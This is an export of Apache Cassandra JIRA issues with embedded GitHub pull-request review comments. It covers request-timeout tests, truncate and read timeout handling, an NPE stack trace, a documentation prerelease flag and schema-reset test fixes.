+import net.bytebuddy.implementation.bind.annotation.This;
+import org.apache.cassandra.config.Config;
+import org.apache.cassandra.cql3.statements.BatchStatement;
+import org.apache.cassandra.distributed.Cluster;
+import org.apache.cassandra.distributed.api.ConsistencyLevel;
+import org.apache.cassandra.distributed.test.TestBaseImpl;
+import org.apache.cassandra.utils.AssertionUtils;
+import org.apache.cassandra.exceptions.CasWriteTimeoutException;
+import org.apache.cassandra.exceptions.ReadTimeoutException;
+import org.apache.cassandra.exceptions.WriteTimeoutException;
+import org.apache.cassandra.net.Verb;
+import org.apache.cassandra.service.paxos.Paxos;
+import org.apache.cassandra.utils.concurrent.Awaitable;
+import org.apache.cassandra.utils.concurrent.Condition;
+import org.assertj.core.api.Assertions;
+
+import static net.bytebuddy.matcher.ElementMatchers.named;
+import static net.bytebuddy.matcher.ElementMatchers.takesArguments;
+import static org.apache.cassandra.utils.AssertionUtils.isThrowable;
+
+public class RequestTimeoutTest extends TestBaseImpl
+{
+    private static AtomicInteger NEXT = new AtomicInteger(0);
+    private static Cluster CLUSTER;
+
+    @BeforeClass
+    public static void init() throws IOException
+    {
+        CLUSTER = Cluster.build(3)
+                         .withConfig(c -> c.set(""truncate_request_timeout"", ""10s""))
+                         .withInstanceInitializer(BB::install)
+                         .start();
+        init(CLUSTER);
+        CLUSTER.schemaChange(withKeyspace(""CREATE TABLE %s.tbl (pk int PRIMARY KEY, v int)""));
+    }
+
+    @AfterClass
+    public static void cleanup()
+    {
+        if (CLUSTER != null)
+            CLUSTER.close();
+    }
+
+    @Before
+    public void before()
+    {
+        CLUSTER.filters().reset();
+    }
+
+    @Test
+    public void insert()
+    {
+        CLUSTER.filters().verbs(Verb.MUTATION_REQ.id).to(2).drop();
+        Assertions.assertThatThrownBy(() -> CLUSTER.coordinator(1).execute(withKeyspace(""INSERT INTO %s.tbl (pk, v) VALUES (?, ?)""), ConsistencyLevel.ALL, NEXT.getAndIncrement(), NEXT.getAndIncrement()))
+                  .is(isThrowable(WriteTimeoutException.class));
+    }
+
+    @Test
+    public void update()
+    {
+        CLUSTER.filters().verbs(Verb.MUTATION_REQ.id).to(2).drop();
+        Assertions.assertThatThrownBy(() -> CLUSTER.coordinator(1).execute(withKeyspace(""UPDATE %s.tbl SET v=? WHERE pk=?""), ConsistencyLevel.ALL, NEXT.getAndIncrement(), NEXT.getAndIncrement()))
+                  .is(isThrowable(WriteTimeoutException.class));
+    }
+
+    @Test
+    public void batchInsert()
+    {
+        CLUSTER.filters().verbs(Verb.MUTATION_REQ.id).to(2).drop();
+        Assertions.assertThatThrownBy(() -> CLUSTER.coordinator(1).execute(batch(withKeyspace(""INSERT INTO %s.tbl (pk, v) VALUES (?, ?)"")), ConsistencyLevel.ALL, NEXT.getAndIncrement(), NEXT.getAndIncrement()))
+                  .is(isThrowable(WriteTimeoutException.class));
+    }
+
+    @Test
+    public void rangeSelect()
+    {
+        CLUSTER.filters().verbs(Verb.RANGE_REQ.id).to(2).drop();
+        Assertions.assertThatThrownBy(() -> CLUSTER.coordinator(1).execute(withKeyspace(""SELECT * FROM %s.tbl""), ConsistencyLevel.ALL))
+                  .is(isThrowable(ReadTimeoutException.class));
+    }
+
+    @Test
+    public void select()
+    {
+        CLUSTER.filters().verbs(Verb.READ_REQ.id).to(2).drop();
+        Assertions.assertThatThrownBy(() -> CLUSTER.coordinator(1).execute(withKeyspace(""SELECT * FROM %s.tbl WHERE pk=?""), ConsistencyLevel.ALL, NEXT.getAndIncrement()))
+                  .is(isThrowable(ReadTimeoutException.class));
+    }
+
+    @Test
+    public void truncate()
+    {
+        CLUSTER.filters().verbs(Verb.TRUNCATE_REQ.id).to(2).drop();
+        Assertions.assertThatThrownBy(() -> CLUSTER.coordinator(1).execute(withKeyspace(""TRUNCATE %s.tbl""), ConsistencyLevel.ALL))
+                  .is(AssertionUtils.rootCauseIs(TimeoutException.class));
+    }
+
+    @Test
+    public void casV2PrepareInsert()
+    {
+        withPaxos(Config.PaxosVariant.v2);
+
+        CLUSTER.filters().verbs(Verb.PAXOS2_PREPARE_REQ.id).to(2, 3).drop();
+        Assertions.assertThatThrownBy(() -> CLUSTER.coordinator(1).execute(withKeyspace(""INSERT INTO %s.tbl (pk, v) VALUES (?, ?) IF NOT EXISTS""), ConsistencyLevel.ALL, NEXT.getAndIncrement(), NEXT.getAndIncrement()))
+                  .is(isThrowable(CasWriteTimeoutException.class));
+    }
+
+    @Test
+    public void casV2PrepareSelect()
+    {
+        withPaxos(Config.PaxosVariant.v2);
+
+        CLUSTER.filters().verbs(Verb.PAXOS2_PREPARE_REQ.id).to(2, 3).drop();
+        Assertions.assertThatThrownBy(() -> CLUSTER.coordinator(1).execute(withKeyspace(""SELECT * FROM %s.tbl WHERE pk=?""), ConsistencyLevel.SERIAL, NEXT.getAndIncrement()))
+                  .is(isThrowable(ReadTimeoutException.class)); // why does write have its own type but not read?
+    }
+
+    @Test
+    public void casV2CommitInsert()
+    {
+        withPaxos(Config.PaxosVariant.v2);
+
+        CLUSTER.filters().verbs(Verb.PAXOS_COMMIT_REQ.id).to(2, 3).drop();
+        Assertions.assertThatThrownBy(() -> CLUSTER.coordinator(1).execute(withKeyspace(""INSERT INTO %s.tbl (pk, v) VALUES (?, ?) IF NOT EXISTS""), ConsistencyLevel.ALL, NEXT.getAndIncrement(), NEXT.getAndIncrement()))
+                  .is(isThrowable(CasWriteTimeoutException.class));
+    }
+
+    private static void withPaxos(Config.PaxosVariant variant)
+    {
+        CLUSTER.forEach(i -> i.runOnInstance(() -> Paxos.setPaxosVariant(variant)));
+    }
+
+    private static String batch(String cql)
+    {
+        return ""BEGIN "" + BatchStatement.Type.UNLOGGED.name() + "" BATCH\n"" + cql + ""\nAPPLY BATCH"";
+    }
+
+    public static class BB
+    {
+        public static void install(ClassLoader cl, Integer num)
+        {
+            new ByteBuddy().rebase(Condition.Async.class)
+                           .method(named(""await"").and(takesArguments(2)))
+                           .intercept(MethodDelegation.to(BB.class))
+                           .make()
+                           .load(cl, ClassLoadingStrategy.Default.INJECTION);
+        }
+
+        public static boolean await(long time, TimeUnit units, @This Awaitable self, @SuperMethod Method method) throws InterruptedException, InvocationTargetException, IllegalAccessException
+        {
+            // attempt to decouple the two usages of write_request_timeout: await(write_request_timeout) and message expire
+            return (boolean) method.invoke(self, time * 10, units);

Review Comment:
   pushed a patch that makes the tests fail if you remove `BB`, it uses reflection to monitor `isTimeout=true` and asserts that we saw at least one (seems reads can trigger multiple).  All but CAS tests fail with it disabled, and they all pass with it disabled.



;19/Aug/22 22:13;githubbot;600","maedhroz commented on code in PR #1796:
URL: https://github.com/apache/cassandra/pull/1796#discussion_r952861859


##########
src/java/org/apache/cassandra/service/TruncateResponseHandler.java:
##########
@@ -61,24 +63,31 @@ public TruncateResponseHandler(int responseCount)
     public void get() throws TimeoutException
     {
         long timeoutNanos = getTruncateRpcTimeout(NANOSECONDS) - (nanoTime() - start);
-        boolean completedInTime;
+        boolean signaled;
         try
         {
-            completedInTime = condition.await(timeoutNanos, NANOSECONDS); // TODO truncate needs a much longer timeout
+            signaled = condition.await(timeoutNanos, NANOSECONDS); // TODO truncate needs a much longer timeout
         }
         catch (InterruptedException e)
         {
             throw new UncheckedInterruptedException(e);
         }
 
-        if (!completedInTime)
-        {
+        if (!signaled)
             throw new TimeoutException(""Truncate timed out - received only "" + responses.get() + "" responses"");
-        }
 
-        if (truncateFailingReplica != null)
+        if (!failureReasonByEndpoint.isEmpty())
         {
-            throw new TruncateException(""Truncate failed on replica "" + truncateFailingReplica);
+            // clone to make sure no race condition happens

Review Comment:
   No math going on, so we might not strictly need the defensive copy of `failureReasonByEndpoint` now.



;23/Aug/22 16:34;githubbot;600","maedhroz commented on code in PR #1796:
URL: https://github.com/apache/cassandra/pull/1796#discussion_r952862408


##########
src/java/org/apache/cassandra/service/reads/ReadCallback.java:
##########
@@ -120,6 +121,12 @@ public void awaitResults() throws ReadFailureException, ReadTimeoutException
          */
         int received = resolver.responses.size();
         boolean failed = failures > 0 && (blockFor > received || !resolver.isDataPresent());
+        // If all messages came back as a TIMEOUT then signaled=true and failed=true.
+        // Need to distinguish between a timeout and a failure (network, bad data, etc.), so store an extra field.
+        // see CASSANDRA-17828
+        boolean timedout = !signaled;
+        if (failed)
+            timedout = RequestCallback.isTimeout(new HashMap<>(failureReasonByEndpoint));

Review Comment:
   nit: Defensive copy of `failureReasonByEndpoint` isn't strictly necessary now.



;23/Aug/22 16:34;githubbot;600","smiklosovic closed pull request #1796: CASSANDRA-17828: RequestFailure thrown when RequestTimeout should have thrown
URL: https://github.com/apache/cassandra/pull/1796


;29/Aug/22 14:15;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,15000,,,0,15000,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,dcapwell,,,,,,,,,,,,,,Correctness -> Transient Incorrect Response,,,,,,,,Low Hanging Fruit,Unit Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Fri Aug 19 23:45:02 UTC 2022,,,,,,,All,,,,"0|z17u60:",9223372036854775807,,,,maedhroz,,,,Normal,,3.0.0,,https://github.com/apache/cassandra/commit/7dfcba2a923dea75574eaeaf4aa37e2fe0abbbdc,,,,,,,,,new tests,,,,,"19/Aug/22 21:02;maedhroz;+1 (assuming we go the route of making 100% TIMEOUT failure reasons correspond to an overall timeout and expose the failure map otherwise);;;","19/Aug/22 23:45;dcapwell;Starting commit

CI Results (pending):
||Branch||Source||Circle CI||Jenkins||
|trunk|[branch|https://github.com/dcapwell/cassandra/tree/commit_remote_branch/CASSANDRA-17828-trunk-BDF33D62-DC26-4EA5-AF26-4280D949FF0E]|[build|https://app.circleci.com/pipelines/github/dcapwell/cassandra?branch=commit_remote_branch%2FCASSANDRA-17828-trunk-BDF33D62-DC26-4EA5-AF26-4280D949FF0E]|[build|unknown]|
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
WEBSITE – in-tree trunk should be marked as `prerelease: true`,CASSANDRA-17823,13477128,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,milan_k,mck,mck,16/Aug/22 21:37,29/Aug/22 14:14,13/Jul/23 08:40,26/Aug/22 10:20,5.0,,,,,,Documentation/Website,,,,0,lhf,"this will avoid the ""A newer version of this documentation is available."" banner displaying on the version docs for our latest released version.

ref: https://docs.antora.org/antora/latest/component-prerelease/#true

change is to be applied to https://github.com/apache/cassandra/blob/trunk/doc/antora.yml ",,mck,milan_k,,,,,,,,,,,,,"smiklosovic closed pull request #1814: CASSANDRA-17823 Mark antora.yml as prelease:true
URL: https://github.com/apache/cassandra/pull/1814


;29/Aug/22 14:14;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,600,,,0,600,,,,,,,,,,,,,,,CASSANDRA-17748,,,,,,CASSANDRA-17589,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,milan_k,,,,,,,,,,,,,,Correctness -> API / Semantic Definition,,,,,,,,Low Hanging Fruit,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Fri Aug 26 10:20:17 UTC 2022,,,,,,,All,,,,"0|z17t6o:",9223372036854775807,,,,mck,,,,Low,,NA,,https://github.com/apache/cassandra/commit/ea44835bf19c97d2fc8da4e2672d8604d741893d,,,,,,,,,Documentation update,,,,,"25/Aug/22 01:51;milan_k;https://github.com/apache/cassandra/pull/1814;;;","26/Aug/22 10:20;mck;Committed as [ea44835bf19c97d2fc8da4e2672d8604d741893d|https://github.com/apache/cassandra/commit/ea44835bf19c97d2fc8da4e2672d8604d741893d].


Thank you [~milan_k] for your contribution! Great to see this land so quickly 🥳;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
NPE in org.apache.cassandra.cql3.Attributes.getTimeToLive,CASSANDRA-17822,13477113,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,dcapwell,dcapwell,dcapwell,16/Aug/22 19:16,29/Aug/22 14:16,13/Jul/23 08:40,17/Aug/22 21:22,5.0,,,,,,CQL/Semantics,,,,0,,"{code}
java.lang.NullPointerException
at org.apache.cassandra.cql3.Attributes.getTimeToLive(Attributes.java:129)
       at org.apache.cassandra.cql3.statements.ModificationStatement.getTimeToLive(ModificationStatement.java:237)
       at org.apache.cassandra.cql3.statements.ModificationStatement.makeUpdateParameters(ModificationStatement.java:833)
       at org.apache.cassandra.cql3.statements.ModificationStatement.makeUpdateParameters(ModificationStatement.java:799)
       at org.apache.cassandra.cql3.statements.ModificationStatement.addUpdates(ModificationStatement.java:736)
       at org.apache.cassandra.cql3.statements.ModificationStatement.getMutations(ModificationStatement.java:689)
       at org.apache.cassandra.cql3.statements.ModificationStatement.executeWithoutCondition(ModificationStatement.java:470)
       at org.apache.cassandra.cql3.statements.ModificationStatement.execute(ModificationStatement.java:454)
       at org.apache.cassandra.cql3.QueryProcessor.processStatement(QueryProcessor.java:255)
       at org.apache.cassandra.cql3.QueryProcessor.processPrepared(QueryProcessor.java:716)
       at org.apache.cassandra.cql3.QueryProcessor.processPrepared(QueryProcessor.java:678)
       at org.apache.cassandra.transport.messages.ExecuteMessage.execute(ExecuteMessage.java:160)
       at org.apache.cassandra.transport.Message$Request.execute(Message.java:242)
       at org.apache.cassandra.transport.Dispatcher.processRequest(Dispatcher.java:142)
       at org.apache.cassandra.transport.Dispatcher.processRequest(Dispatcher.java:158)
       at org.apache.cassandra.transport.Dispatcher.processRequest(Dispatcher.java:181)
       at org.apache.cassandra.transport.Dispatcher.lambda$dispatch$1(Dispatcher.java:108)
       at java.base/java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:515)
       at org.apache.cassandra.concurrent.AbstractLocalAwareExecutorService$FutureTask.run(AbstractLocalAwareExecutorService.java:162)
       at org.apache.cassandra.concurrent.SEPWorker.run(SEPWorker.java:119)
       at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
       at java.base/java.lang.Thread.run(Thread.java:834)
{code}",,dcapwell,maedhroz,,,,,,,,,,,,,"smiklosovic closed pull request #1792: CASSANDRA-17822: NPE in org.apache.cassandra.cql3.Attributes.getTimeToLive
URL: https://github.com/apache/cassandra/pull/1792


;29/Aug/22 14:16;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,600,,,0,600,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,dcapwell,,,,,,,,,,,,,,Correctness -> API / Semantic Implementation,,,,,,,,Low Hanging Fruit,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Wed Aug 17 16:59:19 UTC 2022,,,,,,,All,,,,"0|z17t3c:",9223372036854775807,,,,maedhroz,,,,Low,,3.0.0,,https://github.com/apache/cassandra/commit/707ebc702eadce188d2d14a5cdbb3d2b1f38a868,,,,,,,,,new tests,,,,,"16/Aug/22 19:59;maedhroz;+1;;;","17/Aug/22 16:59;dcapwell;Starting commit

CI Results (pending):
||Branch||Source||Circle CI||Jenkins||
|trunk|[branch|https://github.com/dcapwell/cassandra/tree/commit_remote_branch/CASSANDRA-17822-trunk-EE85F968-975F-488F-AB44-EBE482CA8D62]|[build|https://app.circleci.com/pipelines/github/dcapwell/cassandra?branch=commit_remote_branch%2FCASSANDRA-17822-trunk-EE85F968-975F-488F-AB44-EBE482CA8D62]|[build|unknown]|
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Test failure: org.apache.cassandra.distributed.test.SchemaTest.schemaReset,CASSANDRA-17819,13477046,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,jlewandowski,adelapena,adelapena,16/Aug/22 11:35,12/Jan/23 08:34,13/Jul/23 08:40,16/Sep/22 08:04,4.0.7,4.1-beta1,5.0,,,,Test/dtest/java,,,,0,,"The test {{{}org.apache.cassandra.distributed.test.SchemaTest.schemaReset{}}}, recently introduced by CASSANDRA-17658, is flaky on 4.1 and trunk:
 * 4.1: [https://ci-cassandra.apache.org/job/Cassandra-4.1/134/testReport/org.apache.cassandra.distributed.test/SchemaTest/schemaReset_2/]
 * trunk: [https://ci-cassandra.apache.org/job/Cassandra-trunk/1265/testReport/org.apache.cassandra.distributed.test/SchemaTest/schemaReset_2/]

{code:java}
Error Message
Condition with lambda expression in org.apache.cassandra.distributed.test.SchemaTest that uses org.apache.cassandra.distributed.Cluster was not fulfilled within 1 minutes.
Stacktrace
org.awaitility.core.ConditionTimeoutException: Condition with lambda expression in org.apache.cassandra.distributed.test.SchemaTest that uses org.apache.cassandra.distributed.Cluster was not fulfilled within 1 minutes.
	at org.awaitility.core.ConditionAwaiter.await(ConditionAwaiter.java:165)
	at org.awaitility.core.CallableCondition.await(CallableCondition.java:78)
	at org.awaitility.core.CallableCondition.await(CallableCondition.java:26)
	at org.awaitility.core.ConditionFactory.until(ConditionFactory.java:895)
	at org.awaitility.core.ConditionFactory.until(ConditionFactory.java:864)
	at org.apache.cassandra.distributed.test.SchemaTest.schemaReset(SchemaTest.java:115)
	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
	at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
Standard Output
INFO  [main] <main> 2022-08-15 15:02:14,783 Reflections.java:219 - Reflections took 1873 ms to scan 8 urls, producing 1754 keys and 6912 values
INFO  [main] <main> 2022-08-15 15:02:16,407 Reflections.java:219 - Reflections took 1561 ms to scan 8 urls, producing 1754 keys and 6912 values
Node id topology:
node 1: dc = datacenter0, rack = rack0
node 2: dc = datacenter0, rack = rack0
Configured node count: 2, nodeIdTopology size: 2
DEBUG [main] node1 2022-08-15 15:02:17,554 InternalLoggerFactory.ja
...[truncated 1761288 chars]...
cutor$ScheduledFutureTask.run(ScheduledThreadPoolExecutor.java:293)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)
	at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
	at java.lang.Thread.run(Thread.java:748)
INFO  [node2_isolatedExecutor:3] node2 2022-08-15 15:03:52,096 MessagingService.java:519 - Waiting for messaging service to quiesce
{code}",,adelapena,bdeggleston,bereng,e.dimitrova,jlewandowski,smiklosovic,,,,,,,,,"ekaterinadimitrova2 commented on code in PR #1804:
URL: https://github.com/apache/cassandra/pull/1804#discussion_r953106530


##########
src/java/org/apache/cassandra/config/CassandraRelevantProperties.java:
##########
@@ -235,6 +235,7 @@
     MEMTABLE_OVERHEAD_SIZE(""cassandra.memtable.row_overhead_size"", ""-1""),
     MEMTABLE_OVERHEAD_COMPUTE_STEPS(""cassandra.memtable_row_overhead_computation_step"", ""100000""),
     MIGRATION_DELAY(""cassandra.migration_delay_ms"", ""60000""),
+    SCHEMA_PULL_INTERVAL(""cassandra.schema_pull_interval_ms"", ""60000""),

Review Comment:
   How about some Javadoc?  



##########
src/java/org/apache/cassandra/schema/DefaultSchemaUpdateHandler.java:
##########
@@ -253,20 +264,28 @@ private synchronized SchemaTransformationResult reload()
     }
 
     @Override
-    public SchemaTransformationResult reset(boolean local)
+    public void reset(boolean local)
     {
         if (local)
-            return reload();
-
-        Collection<Mutation> mutations = migrationCoordinator.pullSchemaFromAnyNode().awaitThrowUncheckedOnInterrupt().getNow();
-        return applyMutations(mutations);
+        {
+            reload();

Review Comment:
   Do we still need to return in `reload()`? Seems like this is the only usage



##########
src/java/org/apache/cassandra/schema/DefaultSchemaUpdateHandler.java:
##########
@@ -232,12 +240,15 @@ public synchronized SchemaTransformationResult apply(SchemaTransformation transf
 
     private void updateSchema(SchemaTransformationResult update, boolean local)
     {
-        this.schema = update.after;
-        logger.debug(""Schema updated: {}"", update);
-        updateCallback.accept(update, true);
-        if (!local)
+        if (!update.diff.isEmpty())
         {
-            migrationCoordinator.announce(update.after.getVersion());
+            this.schema = update.after;
+            logger.debug(""Schema updated: {}"", update);
+            updateCallback.accept(update, true);
+            if (!local)
+            {
+                migrationCoordinator.announce(update.after.getVersion());
+            }

Review Comment:
   Shall we add some logging in case no update has happened?  



##########
src/java/org/apache/cassandra/schema/MigrationCoordinator.java:
##########
@@ -323,7 +372,7 @@ private boolean shouldPullFromEndpoint(InetAddressAndPort endpoint)
 
         if (!messagingService.versions.knows(endpoint))
         {
-            logger.debug(""Not pulling schema from {} because their messaging version is unknown"", endpoint);
+            logger.trace(""Not pulling schema from {} because their messaging version is unknown"", endpoint);

Review Comment:
   Why this was switched to trace? 



##########
src/java/org/apache/cassandra/schema/MigrationCoordinator.java:
##########
@@ -180,6 +199,18 @@ boolean wasReceived()
         {
             return receivedSchema;
         }
+
+        @Override
+        public String toString()

Review Comment:
   Do we actually use this one anywhere? 



##########
src/java/org/apache/cassandra/schema/MigrationCoordinator.java:
##########
@@ -149,12 +153,27 @@ private static Set<InetAddressAndPort> getIgnoredEndpoints()
     {
         final UUID version;
 
+        /**
+         * The set of endpoints containing this schema version
+         */
         final Set<InetAddressAndPort> endpoints           = Sets.newConcurrentHashSet();
+        /**
+         * The set of endpoints from which we are already fetching the schema
+         */
         final Set<InetAddressAndPort> outstandingRequests = Sets.newConcurrentHashSet();
+        /**
+         * The queue of endpoint from which we are going to fetch the schema

Review Comment:
   nit: endpoints



##########
src/java/org/apache/cassandra/schema/MigrationCoordinator.java:
##########
@@ -403,16 +461,61 @@ private synchronized void removeEndpointFromVersion(InetAddressAndPort endpoint,
             return;
 
         info.endpoints.remove(endpoint);
+        logger.trace(""Removed endpoint {} from schema {}: {}"", endpoint, version, info);
         if (info.endpoints.isEmpty())
         {
             info.waitQueue.signalAll();
             versionInfo.remove(version);
+            logger.trace(""Removed schema info: {}"", info);
         }
     }
 
+    /**
+     * Resets the migration coordinator by notifying all waiting threads and removing all the existing version info.
+     * Then, it is populated with the information about schema versions on different endpoints provided by Gossiper.
+     * Each version is marked as unreceived so the migration coordinator will start pulling schemas from other nodes.
+     */
+    synchronized void reset()
+    {
+        logger.info(""Resetting migration coordinator..."");
+
+        this.endpointVersions.clear();
+
+        Iterator<Map.Entry<UUID, VersionInfo>> it = versionInfo.entrySet().iterator();
+        while (it.hasNext())
+        {
+            Map.Entry<UUID, VersionInfo> entry = it.next();
+            it.remove();
+            entry.getValue().waitQueue.signal();
+        }
+
+        // now report again the versions we are aware of
+        gossiper.getLiveMembers().forEach(endpoint -> {
+            if (FBUtilities.getBroadcastAddressAndPort().equals(endpoint))
+            {
+                reportEndpointVersion(endpoint, schemaVersion.get());
+            }
+            else
+            {
+                EndpointState state = gossiper.getEndpointStateForEndpoint(endpoint);
+                if (state != null)
+                {
+                    UUID v = state.getSchemaVersion();
+                    if (v != null)
+                    {
+                        reportEndpointVersion(endpoint, v);
+                    }
+                }
+            }
+        });
+    }
+
     synchronized void removeAndIgnoreEndpoint(InetAddressAndPort endpoint)
     {
+        logger.debug(""Removing and ignoring endpoint {}"", endpoint);
         Preconditions.checkArgument(endpoint != null);
+        // TODO The endpoint address is now ignored but when a node with the same address is added again later,
+        //  there will be no way to include it in schema synchronization other than restarting each other node

Review Comment:
   I think I mentioned in the previous version but for completeness - I think this TO DO deserves to be documented actually



##########
test/distributed/org/apache/cassandra/distributed/test/SchemaTest.java:
##########
@@ -95,21 +98,37 @@ private void selectSilent(Cluster cluster, String name)
     @Test
     public void schemaReset() throws Throwable
     {
+        CassandraRelevantProperties.MIGRATION_DELAY.setLong(10000);
+        CassandraRelevantProperties.SCHEMA_PULL_INTERVAL.setLong(10000);
         try (Cluster cluster = init(Cluster.build(2).withConfig(cfg -> cfg.with(Feature.GOSSIP, Feature.NETWORK)).start()))
         {
             cluster.schemaChange(""CREATE TABLE "" + KEYSPACE + "".tbl (pk INT PRIMARY KEY, v TEXT)"");
 
             assertTrue(cluster.get(1).callOnInstance(() -> Schema.instance.getTableMetadata(KEYSPACE, ""tbl"") != null));
             assertTrue(cluster.get(2).callOnInstance(() -> Schema.instance.getTableMetadata(KEYSPACE, ""tbl"") != null));
 
+            // now we have a table tbl in the schema of both nodes
+
             cluster.get(2).shutdown().get();
 
-            // when schema is removed and there is no other node to fetch it from, node 1 should be left with clean schema
-            cluster.get(1).runOnInstance(() -> Schema.instance.resetLocalSchema());
+            // when there is no node to fetch the schema from, reset local schema should immediately fail

Review Comment:
   How does this work in previous versions?



##########
src/java/org/apache/cassandra/schema/DefaultSchemaUpdateHandler.java:
##########
@@ -253,20 +264,28 @@ private synchronized SchemaTransformationResult reload()
     }
 
     @Override
-    public SchemaTransformationResult reset(boolean local)
+    public void reset(boolean local)
     {
         if (local)
-            return reload();
-
-        Collection<Mutation> mutations = migrationCoordinator.pullSchemaFromAnyNode().awaitThrowUncheckedOnInterrupt().getNow();
-        return applyMutations(mutations);
+        {
+            reload();
+        }
+        else
+        {
+            migrationCoordinator.reset();
+            if (!migrationCoordinator.awaitSchemaRequests(CassandraRelevantProperties.MIGRATION_DELAY.getLong()))
+            {
+                logger.error(""Timeout exceeded when waiting for schema from other nodes"");
+            }
+        }
     }
 
     @Override
     public synchronized void clear()
     {
+        schema = DistributedSchema.EMPTY;

Review Comment:
   Why did you decide to move it up? 



##########
src/java/org/apache/cassandra/schema/Schema.java:
##########
@@ -611,18 +613,42 @@ public SchemaTransformationResult transform(SchemaTransformation transformation,
      * Clear all locally stored schema information and fetch schema from another node.
      * Called by user (via JMX) who wants to get rid of schema disagreement.
      */
-    public synchronized void resetLocalSchema()
+    public void resetLocalSchema()
     {
         logger.debug(""Clearing local schema..."");
-        updateHandler.clear();
 
-        logger.debug(""Clearing local schema keyspace instances..."");
-        distributedKeyspaces.forEach(this::unload);

Review Comment:
   Where did the unload go? 



##########
src/java/org/apache/cassandra/schema/Schema.java:
##########
@@ -611,18 +613,42 @@ public SchemaTransformationResult transform(SchemaTransformation transformation,
      * Clear all locally stored schema information and fetch schema from another node.
      * Called by user (via JMX) who wants to get rid of schema disagreement.
      */
-    public synchronized void resetLocalSchema()

Review Comment:
   Why this change?



##########
src/java/org/apache/cassandra/schema/MigrationCoordinator.java:
##########
@@ -369,22 +418,31 @@ private synchronized boolean shouldApplySchemaFor(VersionInfo info)
 
     synchronized Future<Void> reportEndpointVersion(InetAddressAndPort endpoint, UUID version)
     {
+        logger.debug(""Reported schema {} at endpoint {}"", version, endpoint);
         if (ignoredEndpoints.contains(endpoint) || IGNORED_VERSIONS.contains(version))
         {
             endpointVersions.remove(endpoint);
             removeEndpointFromVersion(endpoint, null);
+            logger.debug(""Discarding endpoint {} or schema {} because either endpoint or schema version were marked as ignored"", endpoint, version);
             return FINISHED_FUTURE;
         }
 
         UUID current = endpointVersions.put(endpoint, version);
         if (current != null && current.equals(version))
+        {
+            logger.trace(""Skipping report of schema {} from {} because we already know that"", version, endpoint);
             return FINISHED_FUTURE;
+        }
 
         VersionInfo info = versionInfo.computeIfAbsent(version, VersionInfo::new);
         if (Objects.equals(schemaVersion.get(), version))
+        {
             info.markReceived();
+            logger.trace(""Schema {} from {} has been marked as recevied because it is equal the local schema"", version, endpoint);
+        }
         info.endpoints.add(endpoint);
-        info.requestQueue.addFirst(endpoint);
+        info.requestQueue.addFirst(endpoint); // TODO not sure if it is correct - given we've just marked this schema version as received, why do we add a request to receive it?

Review Comment:
   Have to think a bit about this TO DO



;24/Aug/22 00:42;githubbot;600","jacek-lewandowski commented on code in PR #1804:
URL: https://github.com/apache/cassandra/pull/1804#discussion_r956211168


##########
test/distributed/org/apache/cassandra/distributed/test/SchemaTest.java:
##########
@@ -95,21 +98,37 @@ private void selectSilent(Cluster cluster, String name)
     @Test
     public void schemaReset() throws Throwable
     {
+        CassandraRelevantProperties.MIGRATION_DELAY.setLong(10000);
+        CassandraRelevantProperties.SCHEMA_PULL_INTERVAL.setLong(10000);
         try (Cluster cluster = init(Cluster.build(2).withConfig(cfg -> cfg.with(Feature.GOSSIP, Feature.NETWORK)).start()))
         {
